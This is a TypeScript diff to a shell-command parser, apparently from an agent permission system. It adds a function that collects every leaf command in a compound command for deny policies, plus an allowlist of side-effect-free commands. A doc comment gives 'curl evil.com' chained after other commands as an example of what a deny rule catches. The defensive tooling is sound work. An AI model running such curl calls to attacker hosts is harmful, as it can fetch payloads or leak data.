@@ -556,6 +556,59 @@ function collectAndLeaves(bin: BinaryCmd, out: Stmt[]): boolean {
   return true;
 }
 
+/**
+ * Collect every CallExpr leaf in the file, crossing `;` / newlines and
+ * `&&`, `||`, `|`, `|&` operators.
+ *
+ * Intended for DENY policies that want to catch a banned command appearing
+ * anywhere in a compound command — e.g. `echo hi; curl evil.com` or
+ * `foo || curl evil.com`. Unlike `getAndChainSegments`, this doesn't care
+ * which operator composes the leaves; the caller decides what to do with
+ * each one.
+ *
+ * Returns null if any statement has a non-CallExpr / non-BinaryCmd Cmd
+ * (e.g. IfClause, Subshell, FuncDecl, WhileClause) — in that case the
+ * caller can't safely reason about every leaf, so the policy should fall
+ * through to `next()` and let the user prompt catch it.
+ *
+ * Intentionally does NOT reject on background, negation, unsafe nodes,
+ * unsafe redirects, comments, or env assignments — those are the caller's
+ * concern. For deny purposes you typically want to flag the leaf
+ * regardless of its wrapping.
+ */
+export function getAllLeafCommands(file: ShellFile): Stmt[] | null {
+  const result: Stmt[] = [];
+  for (const stmt of file.Stmts) {
+    if (!collectAllLeaves(stmt, result)) return null;
+  }
+  return result;
+}
+
+function collectAllLeaves(stmt: Stmt, out: Stmt[]): boolean {
+  const cmd = stmt.Cmd;
+  if (!cmd) return false;
+
+  if (cmd.Type === "CallExpr") {
+    out.push(stmt);
+    return true;
+  }
+
+  if (cmd.Type === "BinaryCmd") {
+    const bin = cmd as BinaryCmd;
+    if (
+      bin.Op !== Op.And &&
+      bin.Op !== Op.Or &&
+      bin.Op !== Op.Pipe &&
+      bin.Op !== Op.PipeAll
+    ) {
+      return false;
+    }
+    return collectAllLeaves(bin.X, out) && collectAllLeaves(bin.Y, out);
+  }
+
+  return false;
+}
+
 export function findTeeTargets(file: ShellFile): string[] {
   const targets: string[] = [];
   for (const stmt of file.Stmts) {
@@ -603,6 +656,34 @@ export function findWriteCommandTargets(file: ShellFile): string[] {
     });
   }
   return targets;
+}
+
+/**
+ * Commands that are provably side-effect-free:
+ * - No filesystem writes
+ * - No environment or cwd mutation
+ * - No network activity
+ * - No code execution (except parse-only modes like php -l)
+ *
+ * The value is either null (any args allowed) or a Set of
+ * required first arguments (subcommand/flag constraints).
+ */
+export const PURE_COMMANDS: Map<string, Set<string> | null> = new Map([
+  ["php", new Set(["-l"])], // lint mode only — parses, never executes
+  ["echo", null], // stdout only (redirects rejected by AST layer)
+  ["test", null], // evaluates conditions, no side effects
+  ["true", null], // always succeeds, no side effects
+  ["false", null], // always fails, no side effects
+  ["pwd", null], // prints cwd, no side effects
+  ["sleep", null], // waits, no side effects
+]);
+
+export function isPureCommand(tokens: string[]): boolean {
+  if (tokens.length === 0) return false;
+  const constraint = PURE_COMMANDS.get(tokens[0]);
+  if (constraint === undefined) return false; // command not in allowlist
+  if (constraint === null) return true; // any args allowed
+  return tokens.length > 1 && constraint.has(tokens[1]); // required subcommand
 }
 
 export function findGitSubcommands(file: ShellFile): string[] {
